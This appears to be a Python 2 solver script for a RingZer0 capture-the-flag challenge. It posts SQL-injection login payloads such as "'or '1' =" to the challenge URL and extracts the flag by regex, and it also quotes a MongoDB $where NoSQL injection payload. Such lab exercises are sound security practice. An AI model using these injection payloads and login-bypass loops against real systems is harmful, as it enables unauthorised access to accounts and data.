#!/bin/python2
# coding: utf-8
import requests
import re



'''




    app.get('/', function(req, res) {
        db.collection('movies').find({}).toArray(function(err, docs) {
            res.render('index', {'movies': docs} );
        }); 
    }); 

    app.post('/', function(req, res) {
        var title = req.body.movieTitle;
        var year = req.body.movieYear;
        var imdb = req.body.movieIMDB;

        db.collection('movies').insertOne({
                                            title: title,
                                            year: year,
                                            imdb: imdb
                                        }, function(err, doc) {
                                            assert.equal(null, err);
                                            res.render('newmovie', {movie: req.body});
                                        }   
        );  

    }); 


 {'$where':"this.CompanyName =='nop' UNION true"}
'''

payload = "nop' || '$where' : true"

class data_post:
    def __init__(self):

        #   R E G X : 
        self.regx=["flag.*","(?<=alert alert-danger\"\>).*(?=\<)"]
        
        #   U S E R N A M E 
        self.username=["'or '1' = "]
               
        #   P A S S W O R D 
        self.password=[""]


        #   U R L 
        self.url=["http://challenges.ringzer0team.com:20003/chal03.php"]

class data_values:
    def __init__(self):

        # ' F O R M   V A L U E '   O F   T H E   H T M L.
        self.username='username' 
        self.password='password'


if __name__=='__main__':

    #init classes
    data_values=data_values()
    data_post=data_post()
    
    session = requests.Session()

    for _url in data_post.url:
        next_url=False

        for _username, _password in zip(data_post.username, data_post.password):
            if next_url: 
                break    
            data={
                data_values.username: _username,
                data_values.password: _password
                    }
        
            login = session.post( _url, data=data)
            for _regx in data_post.regx:
                flag=re.search(_regx, login.content)
                try:
                    print '\033c' # clear screen
                    print '\n[*] {}\n`-->: {}\n'.format(flag.group(0),_url)
                except Exception, e:
                    continue
                next_url = True
